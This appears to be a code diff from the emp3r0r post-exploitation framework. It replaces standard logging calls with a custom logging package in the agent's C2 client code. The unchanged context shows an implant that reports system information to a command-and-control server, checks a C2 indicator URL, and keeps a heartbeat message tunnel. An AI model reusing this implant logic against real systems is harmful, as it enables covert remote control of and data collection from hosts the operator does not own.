@@ -5,7 +5,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
-	"log"
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"net"
 	"net/http"
 	"net/url"
@@ -25,7 +25,7 @@ import (
 // CheckIn poll CC server and report its system info
 func CheckIn(info *def.Emp3r0rAgent) (err error) {
 	checkin_URL := def.CCAddress + transport.CheckInAPI + "/" + uuid.NewString()
-	log.Printf("Collected system info, now checking in (%s)", checkin_URL)
+	logging.Printf("Collected system info, now checking in (%s)", checkin_URL)
 
 	conn, _, _, err := ConnectCC(checkin_URL)
 	if err != nil {
@@ -35,14 +35,14 @@ func CheckIn(info *def.Emp3r0rAgent) (err error) {
 	out := json.NewEncoder(conn)
 	err = out.Encode(info)
 	if err == nil {
-		log.Println("Checked in")
+		logging.Println("Checked in")
 	}
 	return err
 }
 
 // ConditionalC2Yes check common.RuntimeConfig.CCIndicator for conditional C2 connetion
 func ConditionalC2Yes(proxy string) bool {
-	log.Printf("Checking CCIndicator: %s", common.RuntimeConfig.CCIndicatorURL)
+	logging.Printf("Checking CCIndicator: %s", common.RuntimeConfig.CCIndicatorURL)
 	t := &http.Transport{
 		Dial: (&net.Dialer{
 			Timeout:   60 * time.Second,
@@ -53,10 +53,10 @@ func ConditionalC2Yes(proxy string) bool {
 	if proxy != "" && strings.HasPrefix(def.Transport, "HTTP2") {
 		proxyUrl, err := url.Parse(proxy)
 		if err != nil {
-			log.Fatalf("invalid proxy: %v", err)
+			logging.Fatalf("invalid proxy: %v", err)
 		}
 		t.Proxy = http.ProxyURL(proxyUrl)
-		log.Printf("IsCCOnline: using proxy %s", proxy)
+		logging.Printf("IsCCOnline: using proxy %s", proxy)
 	}
 	client := http.Client{
 		Transport: t,
@@ -64,12 +64,12 @@ func ConditionalC2Yes(proxy string) bool {
 	}
 	resp, err := client.Get(common.RuntimeConfig.CCIndicatorURL)
 	if err != nil {
-		log.Printf("IsCCOnline: %s: %v", common.RuntimeConfig.CCIndicatorURL, err)
+		logging.Printf("IsCCOnline: %s: %v", common.RuntimeConfig.CCIndicatorURL, err)
 		return false
 	}
 	_, err = io.ReadAll(resp.Body)
 	if err != nil {
-		log.Printf("IsCCOnline: %s: %v", common.RuntimeConfig.CCIndicatorURL, err)
+		logging.Printf("IsCCOnline: %s: %v", common.RuntimeConfig.CCIndicatorURL, err)
 		return false
 	}
 	defer resp.Body.Close()
@@ -81,7 +81,7 @@ func catchInterruptAndExit(cancel context.CancelFunc) {
 	sig := make(chan os.Signal, 1)
 	signal.Notify(sig, os.Interrupt)
 	<-sig
-	log.Println("Cancelling due to interrupt")
+	logging.Println("Cancelling due to interrupt")
 	cancel()
 	os.Exit(0)
 }
@@ -103,32 +103,32 @@ func CCMsgTun(callback func(*def.MsgTunData), ctx context.Context, cancel contex
 	defer func() {
 		err = def.CCMsgConn.Close()
 		if err != nil {
-			log.Print("CCMsgTun closing: ", err)
+			logging.Print("CCMsgTun closing: ", err)
 		}
 
 		cancel()
 		def.KCPKeep = false // tell KCPClient to close this conn so we won't stuck
-		log.Print("CCMsgTun closed")
+		logging.Print("CCMsgTun closed")
 	}()
 
 	// check for CC server's response
 	go func() {
-		log.Println("Check CC response: started")
+		logging.Println("Check CC response: started")
 		defer cancel()
 		for ctx.Err() == nil {
 			// read response
 			err = in.Decode(&msg)
 			if err != nil {
-				log.Print("Check CC response: JSON msg decode: ", err)
+				logging.Print("Check CC response: JSON msg decode: ", err)
 				break
 			}
 			resp := msg.Response
 			if strings.HasPrefix(resp, "hello") {
-				log.Printf("Hello (%s) received", resp)
+				logging.Printf("Hello (%s) received", resp)
 				// mark the hello as success
 				for hello := range HandShakes {
 					if msg.CmdID == hello {
-						log.Printf("Hello (%s) acknowledged", resp)
+						logging.Printf("Hello (%s) acknowledged", resp)
 						HandShakesMutex.Lock()
 						HandShakes[hello] = true
 						HandShakesMutex.Unlock()
@@ -141,7 +141,7 @@ func CCMsgTun(callback func(*def.MsgTunData), ctx context.Context, cancel contex
 			// process CC data
 			go callback(&msg)
 		}
-		log.Println("Check CC response: exited")
+		logging.Println("Check CC response: exited")
 	}()
 
 	wait_hello := func(hello_id string) bool {
@@ -158,12 +158,12 @@ func CCMsgTun(callback func(*def.MsgTunData), ctx context.Context, cancel contex
 			isSuccess := HandShakes[hello_id]
 			HandShakesMutex.RUnlock()
 			if isSuccess {
-				log.Printf("Hello (%s) done", hello_id)
+				logging.Printf("Hello (%s) done", hello_id)
 				return true
 			}
 			time.Sleep(time.Millisecond)
 		}
-		log.Printf("Hello (%s) timeout", hello_id)
+		logging.Printf("Hello (%s) timeout", hello_id)
 		return false
 	}
 
@@ -179,14 +179,14 @@ func CCMsgTun(callback func(*def.MsgTunData), ctx context.Context, cancel contex
 			hello_msg.Tag = common.RuntimeConfig.AgentTag
 			err = out.Encode(hello_msg)
 			if err != nil {
-				log.Printf("agent cannot connect to cc: %v", err)
+				logging.Printf("agent cannot connect to cc: %v", err)
 				util.TakeABlink()
 				continue
 			}
 			HandShakesMutex.Lock()
 			HandShakes[hello_msg.CmdID] = false
 			HandShakesMutex.Unlock()
-			log.Printf("Hello (%v) sent", hello_msg.CmdSlice)
+			logging.Printf("Hello (%v) sent", hello_msg.CmdSlice)
 			if !wait_hello(hello_msg.CmdID) {
 				cancel()
 				break
@@ -198,15 +198,15 @@ func CCMsgTun(callback func(*def.MsgTunData), ctx context.Context, cancel contex
 
 	// keep connected
 	for ctx.Err() == nil {
-		log.Println("Hearbeat begins")
+		logging.Println("Hearbeat begins")
 		if !sendHello(util.RandInt(1, 10)) {
-			log.Print("sendHello failed")
+			logging.Print("sendHello failed")
 			break
 		}
 		if err != nil {
-			log.Printf("Updating agent sysinfo: %v", err)
+			logging.Printf("Updating agent sysinfo: %v", err)
 		}
-		log.Println("Hearbeat ends")
+		logging.Println("Hearbeat ends")
 		util.TakeASnap()
 	}
 
